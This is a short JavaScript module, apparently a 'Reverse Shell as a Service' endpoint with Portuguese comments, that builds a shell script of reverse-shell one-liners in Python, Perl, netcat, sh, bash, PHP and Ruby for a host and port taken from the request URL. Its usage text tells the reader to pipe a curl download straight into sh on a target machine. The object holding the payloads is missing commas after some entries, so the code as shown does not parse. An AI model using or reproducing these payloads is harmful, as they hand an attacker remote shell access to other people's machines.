'use strict';

const usage = `# Reverse Shell as a Service
# Baseado do: https://github.com/lukechilds/reverse-shell
# Código fonte em: https://github.com/afonso/rvrs
#
# 1. Na sua máquina:
#      nc -l 4444
#
# 2. Na máquina alvo:
#      curl https://rvrs.herokuapp.com/seuip:4444 | sh
#
# 3. Não seja cuzão`;

const generateScript = (host, port) => {
	const payloads = {
		python: `python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("${host}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`,
		perl: `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
		nc: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${host} ${port} >/tmp/f`,
		sh: `/bin/sh -i >& /dev/tcp/${host}/${port} 0>&1`
		bash: `bash -i >& /dev/tcp/${host}/${port} 0>&1`
		php: `php -r '$sock=fsockopen("${host}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`
		ruby: `ruby -rsocket -e'f=TCPSocket.open("${host}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`
	};

	return Object.entries(payloads).reduce((script, [cmd, payload]) => {
		script += `

if command -v ${cmd} > /dev/null 2>&1; then
	${payload}
	exit;
fi`;

		return script;
	}, '');
};

const reverseShell = req => {
	const [host, port] = req.url.substr(1).split(':');
	return usage + (host && port && generateScript(host, port));
};

module.exports = reverseShell;
